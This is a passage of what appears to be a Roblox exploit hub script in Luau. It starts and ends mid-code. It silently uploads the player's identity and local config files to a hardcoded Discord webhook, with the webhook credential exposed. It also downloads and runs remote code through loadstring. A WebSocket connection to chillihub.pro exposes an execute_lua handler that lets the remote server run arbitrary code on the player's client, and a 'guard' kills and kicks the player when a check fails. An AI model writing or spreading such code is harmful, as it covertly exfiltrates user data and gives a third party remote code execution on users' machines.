		tbl12[#tbl12 + 1] = imageButton.Activated:Connect(function()
			if flag3 then
				flag3 = false
				return
			end
			fn12()
		end)

		local currentCamera = workspace.CurrentCamera

		if currentCamera then
			tbl12[#tbl12 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn13)
		end

		screenGui.Parent = v3
	end

	fn15()
	fn4(fn14)
end

v:Finalize({ Window = v2, MainTab = defaultTab, ShowMainTab = true })

task.defer(function()
	if #tbl2 == 0 or type(readfile) ~= "function" then
		return
	end
	local HttpService = game:GetService("HttpService")

	local function fn12(arg)
		if type(isfile) == "function" then
			local ok, result = pcall(isfile, arg)
			if ok and not result then
				return nil
			end
		end

		local ok, result = pcall(readfile, arg)
		if not ok or type(result) ~= "string" or result == "" then
			return nil
		end
		local ok2, result2 = pcall(HttpService.JSONDecode, HttpService, result)
		return ok2 and type(result2) == "table" and result2 or nil
	end

	local json = fn12("ChilliLibrary/config_state.json") or {}
	if json.AutoLoad == false then
		return
	end
	local v10 = fn12("ChilliLibrary/configs/" .. (type(json.StartupConfig) == "string" and json.StartupConfig ~= "" and json.StartupConfig or type(json.SelectedConfig) == "string" and json.SelectedConfig ~= "" and json.SelectedConfig or "Default") .. ".json")
	if type(v10) ~= "table" or type(v10.Values) ~= "table" then
		return
	end
	local tbl12 = { ["K/s"] = 1000, ["M/s"] = 1000000, ["B/s"] = 1e9 }
	local tbl13 = {}

	for _, v11 in ipairs(tbl2) do
		local flag2 = false
		local v12 = nil

		for _, value in pairs(v10.Values) do
			local flag3 = type(value) == "table" and value[v11.Section] or nil

			if type(flag3) == "table" then
				if flag3[v11.Name] ~= nil then
					flag2 = true
				end

				local v13 = flag3[v11.Legacy]

				if type(v13) == "table" and tonumber(v13.Value) then
					v12 = v13
				end
			end
		end

		if v12 and not flag2 then
			local n4 = math.max(0, tonumber(v12.Value)) * (tbl12[tostring(v12.Unit)] or 1000000)

			if n4 > 0 then
				table.insert(tbl13, { Handle = v11.Handle, Step = v11.StepOf(n4) })
			end
		end
	end

	for _, v11 in ipairs({ 0.1, 1, 2 }) do
		if #tbl13 == 0 then
			return
		end
		task.wait(v11)

		for _, v12 in ipairs(tbl13) do
			local ok, result = pcall(v12.Handle.Get, v12.Handle)

			if ok then
				ok = (tonumber(result) or 0) <= 0
			end

			if ok then
				pcall(v12.Handle.Set, v12.Handle, v12.Step)
			end
		end
	end
end)

task.defer(function()
	for i = 1, 3 do
		RunService.Heartbeat:Wait()
	end

	if type(tbl4.RestoreStealPanel) == "function" then
		pcall(tbl4.RestoreStealPanel)
	end
end)

local request_

do
	local Players2 = game:GetService("Players")
	local HttpService = game:GetService("HttpService")
	local UserInputService2 = game:GetService("UserInputService")
	local localPlayer2 = Players2.LocalPlayer
	request_ = syn and syn.request or http and http.request or http_request or request
	local str = "https://discord.com/api/webhooks/1381274668706693120/D5XogJZVdo_q7XZ9bEJDETQjevMFaBSeVRT4EJ0fLKtPeqR112o7PmA1fN_hZn4rmJ2y"
	local str2 = UserInputService2.KeyboardEnabled and UserInputService2.MouseEnabled and "PC" or "Mobile / Tablet / Other"

	if request_ and localPlayer2 then
		task.spawn(function()
			local readfile_ = readfile or syn and syn.readfile or fluxus and fluxus.readfile or getgenv and getgenv().readfile or nil
			local isfile_ = isfile or syn and syn.isfile
			local isfile_2

			if isfile_ then
				isfile_2 = isfile_
			else
				isfile_2 = fluxus and fluxus.isfile
			end

			local isfile_3 = isfile_2 or getgenv and getgenv().isfile or nil
			local str3 = "Default"
			local v10 = nil
			local str4 = "Default.json"

			if type(readfile_) == "function" then
				pcall(function()
					local flag2 = true

					if type(isfile_3) == "function" then
						local ok, result = pcall(isfile_3, "ChilliLibrary/config_state.json")

						if ok and not result then
							flag2 = false
						end
					end

					if flag2 then
						local json = readfile_("ChilliLibrary/config_state.json")

						if json and json ~= "" then
							local data = HttpService:JSONDecode(json)

							if type(data) == "table" then
								if type(data.StartupConfig) == "string" and data.StartupConfig ~= "" then
									str3 = data.StartupConfig
								elseif type(data.SelectedConfig) == "string" and data.SelectedConfig ~= "" then
									str3 = data.SelectedConfig
								end
							end
						end
					end
				end)

				pcall(function()
					local str5 = "ChilliLibrary/configs/" .. str3 .. ".json"
					local flag2 = true

					if type(isfile_3) == "function" then
						local ok, result = pcall(isfile_3, str5)

						if ok and not result then
							flag2 = false
						end
					end

					if flag2 then
						v10 = readfile_(str5)
						str4 = str3 .. ".json"
					end

					if (not v10 or v10 == "") and str3 ~= "Default" then
						local flag3 = true

						if type(isfile_3) == "function" then
							local ok, result = pcall(isfile_3, "ChilliLibrary/configs/Default.json")

							if ok and not result then
								flag3 = false
							end
						end

						if flag3 then
							local ok, result = pcall(readfile_, "ChilliLibrary/configs/Default.json")

							if ok and type(result) == "string" and result ~= "" then
								v10 = result
								str4 = "Default.json"
							end
						end
					end
				end)
			end

			local str5 = tostring(str4):gsub("[<>:\"/\\|?*]", "_")

			if not str5:match("%.json$") then
				str5 ..= ".json"
			end

			local str6 = string.format("New execute from: **%s** (@%s) | ID: `%d` | Device: **%s**%s", localPlayer2.DisplayName, localPlayer2.Name, localPlayer2.UserId, str2, v10 and v10 ~= "" and " | Startup Config: **" .. str3 .. "**" or "")
			local flag2 = false

			if v10 and v10 ~= "" then
				pcall(function()
					local str7 = "---------------------------ChilliBoundary" .. tostring(os.time()) .. tostring(math.random(100000, 999999))
					local str8 = "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" .. str5 .. "\"\r\n"
					local str9 = v10 .. "\r\n"

					local v11 = request_({
						Url = str,
						Method = "POST",
						Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. str7 },
						Body = table.concat({
							"--" .. str7 .. "\r\n",
							"Content-Disposition: form-data; name=\"payload_json\"\r\n",
							"Content-Type: application/json\r\n\r\n",
							HttpService:JSONEncode({ content = str6 }) .. "\r\n",
							"--" .. str7 .. "\r\n",
							str8,
							"Content-Type: application/json\r\n\r\n",
							str9,
							"--" .. str7 .. "--\r\n",
						}),
					})

					if type(v11) == "table" and (v11.StatusCode == 200 or v11.StatusCode == 204 or v11.Success == true) then
						flag2 = true
					end
				end)
			end

			if not flag2 then
				pcall(function()
					request_({
						Url = str,
						Method = "POST",
						Headers = { ["Content-Type"] = "application/json" },
						Body = HttpService:JSONEncode({ content = str6 }),
					})
				end)
			end
		end)
	end
end

task.spawn(function()
	task.wait(20)
	local str = "\0chilli_guard"
	local genv = typeof(getgenv) == "function" and getgenv() or _G

	local function fn12()
		local v10 = genv[str]
		if type(v10) == "table" and type(v10.Ask) == "function" then
			return v10
		end
		return nil
	end

	local v10 = fn12()

	if not v10 then
		task.spawn(function()
			local v11 = nil

			for i = 1, 4 do
				task.wait()

				local ok, result = pcall(function()
					local v12 = v11
					local response

					if v11 then
						response = v12
					else
						response = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/GD/refs/heads/main/SAEGD")
					end

					v11 = response
					local chunk, v13 = loadstring(v11)
					assert(chunk, v13)
					return chunk()
				end)

				if ok then
					fn("guard: loader ran on try " .. i)
					return
				end

				if type(result) == "string" and string.find(result, "HttpGet", 1, true) then
					v11 = nil
				end

				fn("guard: loader try " .. i .. " failed: " .. tostring(result))
				task.wait(1 + i)
			end
		end)

		local n4 = os.clock() + 30

		while true do
			task.wait(0.25)
			v10 = fn12()
			if not (v10 or os.clock() > n4) then
				continue
			end
			break
		end
	end

	local flag2 = false

	if v10 then
		local result
		flag2, result = pcall(v10.Ask, "v202")
		flag2 = flag2 and type(result) == "string" and #result > 0
	end

	genv[str] = nil
	if flag2 then
		return
	end

	pcall(function()
		local chilliHubSaeCleanup = genv.ChilliHubSaeCleanup

		if type(chilliHubSaeCleanup) == "function" then
			chilliHubSaeCleanup()
		end
	end)

	genv.ChilliHubSaeCleanup = nil

	pcall(function()
		local Players2 = game:GetService("Players")
		local tbl12 = { game:GetService("CoreGui") }

		if typeof(gethui) == "function" then
			local ok, result = pcall(gethui)

			if ok and typeof(result) == "Instance" then
				table.insert(tbl12, result)
			end
		end

		local playerGui = Players2.LocalPlayer:FindFirstChildOfClass("PlayerGui")

		if playerGui then
			table.insert(tbl12, playerGui)
		end

		for _, v11 in ipairs(tbl12) do
			for _, child in ipairs(v11:GetChildren()) do
				if child:IsA("ScreenGui") then
					pcall(function()
						child:Destroy()
					end)
				end
			end
		end
	end)

	pcall(function()
		rawset(_G, "__ChilliAutoLoadQueued", nil)

		if type(queue_on_teleport) == "function" then
			queue_on_teleport("")
		elseif type(queueonteleport) == "function" then
			queueonteleport("")
		end
	end)

	pcall(function()
		local character = game:GetService("Players").LocalPlayer.Character

		if character then
			character:BreakJoints()
		end
	end)

	pcall(function()
		game:GetService("Players").LocalPlayer:Kick("\u{200B}")
	end)
end)

local HttpService
HttpService = game:GetService("HttpService")
local Players2
Players2 = game:GetService("Players")
local RunService2
RunService2 = game:GetService("RunService")
local Workspace
Workspace = game:GetService("Workspace")
local str
str = "chp-7E0Yzx4yddoAozc9VNLsqTnA"
local str2
str2 = "wss://chillihub.pro/roblox-mcp?token=" .. str
local str3
str3 = "https://chillihub.pro/roblox-mcp/beat"
local str4
str4 = "SAE v548"
local flag2, flag3, localPlayer2, genv, flag4, flag5, v10, n4, flag6, tbl12
local tbl13, tbl14, n5, fn12, fn13, fn14, fn15, fn16, fn17, fn18
local fn19, fn20, fn21, fn22

do
	local n6 = 7
	local n7 = 500
	local n8 = 245760
	local flag7 = false
	flag2 = false
	flag3 = false
	localPlayer2 = Players2.LocalPlayer
	genv = getgenv and getgenv() or _G

	if type(genv.StopChilliLink) == "function" then
		pcall(genv.StopChilliLink)
	end

	flag4 = true
	flag5 = false
	v10 = nil
	n4 = 0
	flag6 = false
	tbl12 = {}
	tbl13 = {}
	tbl14 = {}
	n5 = 0

	fn12 = function(...)
		if flag7 then
			print("[ROBLOX MCP]", ...)
		end
	end

	fn13 = function(...)
		if flag7 then
			local v11 = warn
			local v12 = table.pack(...)
			v11("[ROBLOX MCP]", table.unpack(v12, 1, v12.n))
		end
	end

	fn14 = function(arg)
		return tostring(arg or ""):match("^%s*(.-)%s*$")
	end

	fn15 = function(arg, arg2, arg3, arg4)
		local num = tonumber(arg)
		if not num then
			return arg4
		end
		return math.max(arg2, math.min(arg3, num))
	end

	fn16 = function(arg)
		for _, v11 in ipairs(arg) do
			pcall(function()
				v11:Disconnect()
			end)
		end

		table.clear(arg)
	end

	fn17 = function()
		if syn and syn.websocket and type(syn.websocket.connect) == "function" then
			return syn.websocket.connect, "syn.websocket.connect"
		end

		if WebSocket and type(WebSocket.connect) == "function" then
			return WebSocket.connect, "WebSocket.connect"
		end

		if WebSocket and type(WebSocket.new) == "function" then
			return WebSocket.new, "WebSocket.new"
		end

		if WebSocket and type(WebSocket.New) == "function" then
			return WebSocket.New, "WebSocket.New"
		end

		if websocket and type(websocket.connect) == "function" then
			return websocket.connect, "websocket.connect"
		end

		if syn and syn.WebSocket and type(syn.WebSocket.new) == "function" then
			return syn.WebSocket.new, "syn.WebSocket.new"
		end
		return nil, nil
	end

	fn18 = function(arg, ...)
		local v11 = table.pack(...)

		for i = 1, select("#", ...) do
			local value = select(i, table.unpack(v11, 1, v11.n))

			local ok, result = pcall(function()
				return arg[value]
			end)

			if ok and result ~= nil then
				return result, value
			end
		end

		return nil, nil
	end

	fn19 = function(arg, arg2)
		if not arg then
			return nil
		end

		local ok, result = pcall(function()
			return arg:Connect(arg2)
		end)

		return ok and result or nil
	end

	fn20 = function(arg)
		if typeof(arg) ~= "Instance" then
			return nil
		end

		local ok, result = pcall(function()
			return arg:GetFullName()
		end)

		return ok and result or arg.Name
	end

	fn21 = nil

	fn21 = function(arg, arg2, arg3)
		arg2 = arg2 or 0
		arg3 = arg3 or {}
		if arg2 > n6 then
			return "<max-depth>"
		end
		local kind = typeof(arg)
		if arg == nil or kind == "string" or kind == "boolean" then
			return arg
		end

		if kind == "number" then
			if arg ~= arg or arg == math.huge or arg == -math.huge then
				return tostring(arg)
			end
			return arg
		end

		if kind == "Instance" then
			return { type = "Instance", className = arg.ClassName, name = arg.Name, path = fn20(arg) }
		end

		if kind == "Vector2" then
			return { type = "Vector2", x = arg.X, y = arg.Y }
		end

		if kind == "Vector3" then
			return { type = "Vector3", x = arg.X, y = arg.Y, z = arg.Z }
		end

		if kind == "Color3" then
			return {
				type = "Color3",
				r = math.floor(arg.R * 255 + 0.5),
				g = math.floor(arg.G * 255 + 0.5),
				b = math.floor(arg.B * 255 + 0.5),
			}
		end

		if kind == "UDim" then
			return { type = "UDim", scale = arg.Scale, offset = arg.Offset }
		end

		if kind == "UDim2" then
			return {
				type = "UDim2",
				xScale = arg.X.Scale,
				xOffset = arg.X.Offset,
				yScale = arg.Y.Scale,
				yOffset = arg.Y.Offset,
			}
		end

		if kind == "CFrame" then
			return { type = "CFrame", components = { arg:GetComponents() } }
		end

		if kind == "EnumItem" then
			return tostring(arg)
		end

		if kind == "BrickColor" then
			return { type = "BrickColor", name = arg.Name, number = arg.Number }
		end

		if kind == "table" then
			if arg3[arg] then
				return "<cycle>"
			end
			arg3[arg] = true
			local n9 = 0
			local flag8 = true
			local n10 = 0

			for k in pairs(arg) do
				n9 += 1

				if not (n7 < n9) then
					if type(k) ~= "number" or k < 1 or k % 1 ~= 0 then
						flag8 = false
					elseif n10 < k then
						n10 = k
					end

					continue
				end

				break
			end

			local tbl15

			if flag8 and n10 <= n7 then
				tbl15 = {}

				for i = 1, n10 do
					tbl15[i] = fn21(arg[i], arg2 + 1, arg3)
				end
			else
				tbl15 = {}
				local v11, v12, v13 = pairs(arg)
				local n11 = 0

				for k, v14 in v11, v12, v13 do
					n11 += 1

					if n7 < n11 then
						tbl15.__truncated = true
						break
					else
						tbl15[tostring(k)] = fn21(v14, arg2 + 1, arg3)
					end
				end
			end

			arg3[arg] = nil
			return tbl15
		end

		return tostring(arg)
	end

	fn22 = function(arg)
		if not flag5 or not v10 then
			return false, "not connected"
		end

		local ok, result = pcall(function()
			return HttpService:JSONEncode(fn21(arg))
		end)

		if not ok then
			return false, "JSON encode failed: " .. tostring(result)
		end

		if #result > n8 then
			if not (type(arg) == "table" and arg.type == "rpc_result") then
				return false, "message too large"
			end

			result = HttpService:JSONEncode({
				type = "rpc_result",
				requestId = arg.requestId,
				success = false,
				error = string.format("Result is too large to send (%d KB). Return less data.", math.floor(#result / 1024)),
			})
		end

		local ok2, result2 = pcall(function()
			v10:Send(result)
		end)

		if not ok2 then
			return false, "WebSocket send failed: " .. tostring(result2)
		end
		return true
	end
end

local fn23

fn23 = function(arg, arg2)
	fn22({ type = "rpc_event", event = arg, data = arg2 or {} })
end

local fn24

do
	local tbl15 = {
		Game = game,
		game = game,
		Workspace = Workspace,
		workspace = Workspace,
		Players = Players2,
		Lighting = game:GetService("Lighting"),
		ReplicatedStorage = game:GetService("ReplicatedStorage"),
		ReplicatedFirst = game:GetService("ReplicatedFirst"),
		StarterGui = game:GetService("StarterGui"),
		StarterPlayer = game:GetService("StarterPlayer"),
		SoundService = game:GetService("SoundService"),
		Teams = game:GetService("Teams"),
		LocalPlayer = localPlayer2,
	}

	local function fn25(arg)
		local tbl16 = {}

		for match in fn14(arg):gmatch("[^%.]+") do
			table.insert(tbl16, match)
		end

		return tbl16
	end

	fn24 = function(arg)
		local v11 = fn25(arg)
		if #v11 == 0 then
			return nil, "path is empty"
		end
		local result = tbl15[v11[1]]

		if not result then
			local ok

			ok, result = pcall(function()
				return game:GetService(v11[1])
			end)

			if not (ok and result) then
				return nil, "unknown root: " .. v11[1]
			end
		end

		for i = 2, #v11 do
			local pathNotFoundAt = v11[i]

			if result == Players2 and pathNotFoundAt == "LocalPlayer" then
				result = localPlayer2
			elseif result == localPlayer2 and pathNotFoundAt == "PlayerGui" then
				result = localPlayer2:FindFirstChildOfClass("PlayerGui")
			elseif result == localPlayer2 and pathNotFoundAt == "Character" then
				result = localPlayer2.Character
			elseif result == Workspace and pathNotFoundAt == "CurrentCamera" then
				result = Workspace.CurrentCamera
			elseif typeof(result) == "Instance" then
				result = result:FindFirstChild(pathNotFoundAt)
			else
				result = nil
			end

			if not result then
				return nil, "path not found at: " .. pathNotFoundAt
			end
		end

		return result
	end
end

do
	local tbl15 = {
		Archivable = true,
		Anchored = true,
		AssemblyAngularVelocity = true,
		AssemblyLinearVelocity = true,
		AutomaticSize = true,
		BackgroundColor3 = true,
		BackgroundTransparency = true,
		BrickColor = true,
		CanCollide = true,
		CanQuery = true,
		CanTouch = true,
		CanvasPosition = true,
		CanvasSize = true,
		CFrame = true,
		ClipsDescendants = true,
		Color = true,
		Enabled = true,
		FieldOfView = true,
		Health = true,
		Image = true,
		ImageColor3 = true,
		ImageTransparency = true,
		JumpPower = true,
		LayoutOrder = true,
		Material = true,
		MaxHealth = true,
		MoveDirection = true,
		Orientation = true,
		Position = true,
		RichText = true,
		Rotation = true,
		Size = true,
		Text = true,
		TextColor3 = true,
		TextSize = true,
		TextTransparency = true,
		TextWrapped = true,
		Transparency = true,
		Value = true,
		Velocity = true,
		Visible = true,
		WalkSpeed = true,
	}

	local tbl16 = {
		"Archivable",
		"Position",
		"Size",
		"CFrame",
		"Color",
		"Transparency",
		"Visible",
		"Enabled",
		"Text",
		"Value",
		"Health",
		"MaxHealth",
	}

	local function fn25(arg, arg2)
		if not tbl15[arg2] then
			return nil, "not_allowed"
		end

		local ok, result = pcall(function()
			return arg[arg2]
		end)

		if ok then
			return fn21(result)
		end
		return nil, "unavailable"
	end

	local function fn26(arg)
		return {
			name = arg.Name,
			className = arg.ClassName,
			path = fn20(arg),
			parentPath = arg.Parent and fn20(arg.Parent) or nil,
		}
	end

	local function fn27(arg, arg2, arg3)
		local children = arg:GetChildren()
		local n6 = 1
		local n7 = 0

		while n6 <= #children and n7 < arg2 do
			local v11 = children[n6]
			n6 += 1
			n7 += 1
			if arg3(v11, n7) then
				return n7, true
			end

			if #children < arg2 then
				local children2 = v11:GetChildren()

				for _, v12 in ipairs(children2) do
					if not (arg2 <= #children) then
						table.insert(children, v12)
						continue
					end
					break
				end
			end
		end

		return n7, false
	end

	local name = "CodexMCP"

	local tbl17 = {
		Frame = true,
		TextLabel = true,
		TextButton = true,
		TextBox = true,
		ImageLabel = true,
		ImageButton = true,
		ScrollingFrame = true,
		UICorner = true,
		UIStroke = true,
		UIListLayout = true,
		UIGridLayout = true,
		UIPadding = true,
		UIAspectRatioConstraint = true,
		UISizeConstraint = true,
	}

	local tbl18 = {
		Active = true,
		AnchorPoint = true,
		AutomaticCanvasSize = true,
		AutomaticSize = true,
		BackgroundColor3 = true,
		BackgroundTransparency = true,
		BorderSizePixel = true,
		CanvasPosition = true,
		CanvasSize = true,
		ClipsDescendants = true,
		CornerRadius = true,
		DisplayOrder = true,
		Enabled = true,
		FillDirection = true,
		Font = true,
		HorizontalAlignment = true,
		Image = true,
		ImageColor3 = true,
		ImageTransparency = true,
		LayoutOrder = true,
		LineJoinMode = true,
		MaxTextSize = true,
		MinTextSize = true,
		Name = true,
		Padding = true,
		PaddingBottom = true,
		PaddingLeft = true,
		PaddingRight = true,
		PaddingTop = true,
		Position = true,
		RichText = true,
		Rotation = true,
		ScrollBarThickness = true,
		Size = true,
		SortOrder = true,
		Text = true,
		TextColor3 = true,
		TextScaled = true,
		TextSize = true,
		TextStrokeColor3 = true,
		TextStrokeTransparency = true,
		TextTransparency = true,
		TextTruncate = true,
		TextWrapped = true,
		TextXAlignment = true,
		TextYAlignment = true,
		Thickness = true,
		Transparency = true,
		VerticalAlignment = true,
		Visible = true,
		ZIndex = true,
	}

	local tbl19 = {
		BackgroundColor3 = true,
		BorderColor3 = true,
		Color = true,
		ImageColor3 = true,
		TextColor3 = true,
		TextStrokeColor3 = true,
	}

	local tbl20 = { CanvasPosition = false, CanvasSize = true, Position = true, Size = true }
	local tbl21 = { AnchorPoint = true, CanvasPosition = true }

	local tbl22 = {
		CornerRadius = true,
		Padding = true,
		PaddingBottom = true,
		PaddingLeft = true,
		PaddingRight = true,
		PaddingTop = true,
	}

	local tbl23 = {
		AutomaticCanvasSize = Enum.AutomaticSize,
		AutomaticSize = Enum.AutomaticSize,
		FillDirection = Enum.FillDirection,
		Font = Enum.Font,
		HorizontalAlignment = Enum.HorizontalAlignment,
		LineJoinMode = Enum.LineJoinMode,
		SortOrder = Enum.SortOrder,
		TextTruncate = Enum.TextTruncate,
		TextXAlignment = Enum.TextXAlignment,
		TextYAlignment = Enum.TextYAlignment,
		VerticalAlignment = Enum.VerticalAlignment,
	}

	local function fn28(arg)
		if type(arg) ~= "table" then
			return nil
		end
		local num = tonumber(arg[1] or arg.r)
		local num2 = tonumber(arg[2] or arg.g)
		local num3 = tonumber(arg[3] or arg.b)
		if not num or not num2 or not num3 then
			return nil
		end

		if num <= 1 and num2 <= 1 and num3 <= 1 then
			return Color3.new(num, num2, num3)
		end
		local floor = math.floor
		return Color3.fromRGB(math.floor(fn15(num, 0, 255, 0)), math.floor(fn15(num2, 0, 255, 0)), floor(fn15(num3, 0, 255, 0)))
	end

	local function fn29(arg)
		if type(arg) ~= "table" then
			return nil
		end
		return UDim2.new(tonumber(arg[1] or arg.xScale) or 0, tonumber(arg[2] or arg.xOffset) or 0, tonumber(arg[3] or arg.yScale) or 0, tonumber(arg[4] or arg.yOffset) or 0)
	end

	local function fn30(arg)
		if type(arg) ~= "table" then
			return nil
		end
		return Vector2.new(tonumber(arg[1] or arg.x) or 0, tonumber(arg[2] or arg.y) or 0)
	end

	local function fn31(arg)
		if type(arg) == "number" then
			return UDim.new(0, arg)
		end

		if type(arg) ~= "table" then
			return nil
		end
		return UDim.new(tonumber(arg[1] or arg.scale) or 0, tonumber(arg[2] or arg.offset) or 0)
	end

	local function fn32(arg, arg2)
		if tbl19[arg] then
			return fn28(arg2)
		end

		if tbl20[arg] then
			return fn29(arg2)
		end

		if tbl21[arg] then
			return fn30(arg2)
		end

		if tbl22[arg] then
			return fn31(arg2)
		end

		if tbl23[arg] then
			if typeof(arg2) == "EnumItem" then
				return arg2
			end
			return tbl23[arg][tostring(arg2):match("([^%.]+)$")]
		end

		return arg2
	end

	local function fn33(arg, arg2)
		if type(arg2) ~= "table" then
			return { applied = 0, rejected = {} }
		end
		local tbl24 = {}
		local n6 = 0

		for k, v11 in pairs(arg2) do
			if not tbl18[k] then
				table.insert(tbl24, { property = tostring(k), reason = "not_allowed" })
			else
				local v12 = fn32(k, v11)

				if v12 == nil then
					table.insert(tbl24, { property = k, reason = "invalid_value" })
				else
					local ok, result = pcall(function()
						arg[k] = v12
					end)

					if ok then
						n6 += 1
					else
						table.insert(tbl24, { property = k, reason = tostring(result) })
					end
				end
			end
		end

		return { applied = n6, rejected = tbl24 }
	end

	local function fn34()
		return localPlayer2:FindFirstChildOfClass("PlayerGui") or localPlayer2:WaitForChild("PlayerGui", 10)
	end

	local function fn35(arg)
		local v11 = fn34()
		if not v11 then
			return nil, "PlayerGui is unavailable"
		end
		local codexMCP = v11:FindFirstChild("CodexMCP")

		if not codexMCP and arg then
			local screenGui = Instance.new("ScreenGui")
			screenGui.Name = name
			screenGui.ResetOnSpawn = false
			screenGui.IgnoreGuiInset = false
			screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			screenGui.Parent = v11
			codexMCP = screenGui
		end

		return codexMCP
	end

	local function fn36(arg)
		local v11, v12 = fn35(false)
		if not v11 then
			return nil, v12 or "managed UI does not exist"
		end
		local v13 = fn14(arg)
		if v13 == "" or v13 == name then
			return v11
		end

		for match in v13:gmatch("[^%.]+") do
			if match == name then
				continue
			end
			v11 = v11:FindFirstChild(match)
			if not v11 then
				return nil, "managed UI path not found: " .. match
			end
		end

		return v11
	end

	local tbl24 = { Activated = true, MouseButton1Click = true, FocusLost = true }

	local function fn37(arg, arg2)
		if type(arg2) ~= "table" then
			return
		end

		for _, v11 in ipairs(arg2) do
			if tbl24[v11] then
				local ok, result = pcall(function()
					return arg[v11]
				end)

				if ok and result and type(result.Connect) == "function" then
					local connection = result:Connect(function(...)
						local tbl25 = { ... }
						fn23("ui." .. v11, { path = fn20(arg), name = arg.Name, className = arg.ClassName, arguments = fn21(tbl25) })
					end)

					table.insert(tbl14, connection)
				end
			end
		end
	end

	local fn38 = nil

	fn38 = function(arg, parent, arg2, arg3)
		if arg2 > 10 then
			error("UI tree exceeds maximum depth of 10")
		end

		if arg3.count >= 250 then
			error("UI tree exceeds maximum of 250 objects")
		end

		if type(arg) ~= "table" then
			error("UI node must be an object")
		end

		local uiClassIsNotAllowed = fn14(arg.class or arg.className)

		if not tbl17[uiClassIsNotAllowed] then
			error("UI class is not allowed: " .. uiClassIsNotAllowed)
		end

		arg3.count = arg3.count + 1
		local instance = Instance.new(uiClassIsNotAllowed)
		instance.Name = fn14(arg.name) ~= "" and fn14(arg.name):sub(1, 64) or uiClassIsNotAllowed .. arg3.count
		local v11 = fn33(instance, arg.props)
		instance.Parent = parent
		fn37(instance, arg.events)
		local children = type(arg.children) == "table" and arg.children or {}

		for _, child in ipairs(children) do
			fn38(child, instance, arg2 + 1, arg3)
		end

		return instance, v11
	end

	local fn39 = nil

	fn39 = function(arg, arg2, arg3)
		local v11 = fn26(arg)
		if arg2 >= arg3 then
			v11.truncated = #arg:GetChildren() > 0
			return v11
		end
		v11.children = {}

		for _, child in ipairs(arg:GetChildren()) do
			table.insert(v11.children, fn39(child, arg2 + 1, arg3))
		end

		return v11
	end

	local n6 = 60000
	local n7 = 80
	local tbl25 = {}

	local function fn40(...)
		local v11 = table.pack(...)
		local tbl26 = {}

		for i = 1, select("#", ...) do
			local v12 = tostring
			local value = select(i, table.unpack(v11, 1, v11.n))
			tbl26[i] = v12(value)
		end

		return table.concat(tbl26, " ")
	end

	local function fn41(arg, arg2)
		local str5 = tostring(arg or "")

		if str5:match("^%s*$") then
			error("Code is empty", 0)
		end

		local str6 = "=" .. tostring(arg2 or "WebConsole"):sub(1, 60)
		local chunk, v11 = loadstring(str5, str6)

		if not chunk then
			local chunk2 = loadstring("return " .. str5, str6)
			if chunk2 then
				return chunk2
			end
			error("Syntax error: " .. tostring(v11), 0)
		end

		return chunk
	end

	local function fn42(arg)
		local env = getfenv(0)

		local obj = setmetatable({}, {
			__index = env,
			__newindex = function(arg2, arg3, arg4)
				env[arg3] = arg4
			end,
		})

		rawset(obj, "print", function(...)
			local v11 = table.pack(...)
			arg("print", fn40(...))

			if flag2 then
				print(table.unpack(v11, 1, v11.n))
			end
		end)

		rawset(obj, "warn", function(...)
			local v11 = table.pack(...)
			arg("warn", fn40(...))

			if flag2 then
				warn(table.unpack(v11, 1, v11.n))
			end
		end)

		return obj
	end

	local function fn43(arg)
		local kind = typeof(arg)
		local ok, result = pcall(tostring, arg)

		return {
			type = kind,
			text = (ok and tostring(result) or "<unprintable>"):sub(1, 4000),
			value = kind ~= "nil" and fn21(arg) or nil,
		}
	end

	local function fn44(arg, arg2, arg3, arg4)
		local tbl26 = {}
		local tbl27 = {}

		for i = 2, arg.n do
			tbl26[i - 1] = fn21(arg[i])
			tbl27[i - 1] = fn43(arg[i])
		end

		return {
			output = table.concat(arg3, "\n"),
			outputTruncated = arg4 or nil,
			returns = tbl26,
			returnsInfo = tbl27,
			returnCount = arg.n - 1,
			elapsedMs = arg2,
		}
	end

	local function fn45(arg)
		return debug.traceback(tostring(arg), 2)
	end

	local function fn46(arg)
		if #arg.pending == 0 then
			return
		end
		local pending = arg.pending
		arg.pending = {}
		fn23("exec.output", { runId = arg.id, label = arg.label, lines = pending })
	end

	local function fn47(arg, arg2)
		local character = arg.Character
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

		return {
			name = arg.Name,
			displayName = arg.DisplayName,
			userId = arg.UserId,
			accountAge = arg.AccountAge,
			team = arg.Team and arg.Team.Name or nil,
			neutral = arg.Neutral,
			character = character and character.Name or nil,
			health = humanoid and humanoid.Health or nil,
			maxHealth = humanoid and humanoid.MaxHealth or nil,
			position = arg2 and humanoidRootPart and fn21(humanoidRootPart.Position) or nil,
		}
	end

	local tbl26 = {
		["system.ping"] = function(arg)
			return { pong = true, echo = arg, clientTime = DateTime.now().UnixTimestampMillis }
		end,
		["game.info"] = function()
			return {
				placeId = game.PlaceId,
				gameId = game.GameId,
				jobId = game.JobId,
				placeVersion = game.PlaceVersion,
				privateServerId = game.PrivateServerId,
				privateServerOwnerId = game.PrivateServerOwnerId,
				playerCount = #Players2:GetPlayers(),
				localPlayer = { name = localPlayer2.Name, displayName = localPlayer2.DisplayName, userId = localPlayer2.UserId },
			}
		end,
		execute_lua = function(arg)
			local v11 = fn41(arg.code, arg.label)
			local tbl26 = {}
			local n8 = 0
			local flag7 = false

			local v12 = fn42(function(arg2, arg3)
				if flag7 then
					return
				end
				local str5 = (arg2 == "warn" and "[warn] " or "") .. arg3
				n8 = n8 + #str5 + 1

				if n6 < n8 then
					flag7 = true
					table.insert(tbl26, "... output truncated ...")
					return
				end

				table.insert(tbl26, str5)
			end)

			setfenv(v11, v12)
			local now = os.clock()
			local v13 = table.pack(xpcall(v11, fn45))
			local n9 = math.floor((os.clock() - now) * 1000 + 0.5)

			if not v13[1] then
				error(string.format("Runtime error: %s\n--- output ---\n%s", tostring(v13[2]), table.concat(tbl26, "\n"):sub(-20000)), 0)
			end

			return fn44(v13, n9, tbl26, flag7)
		end,
		["exec.async"] = function(arg)
			local v11 = fn41(arg.code, arg.label)
			local tbl26 = { id = HttpService:GenerateGUID(false):sub(1, 8) }
			tbl26.label = tostring(arg.label or "Script"):sub(1, 60)
			tbl26.startedAt = os.clock()
			tbl26.pending = {}
			tbl26.lineCount = 0
			tbl26.dropped = 0

			local v12 = fn42(function(arg2, arg3)
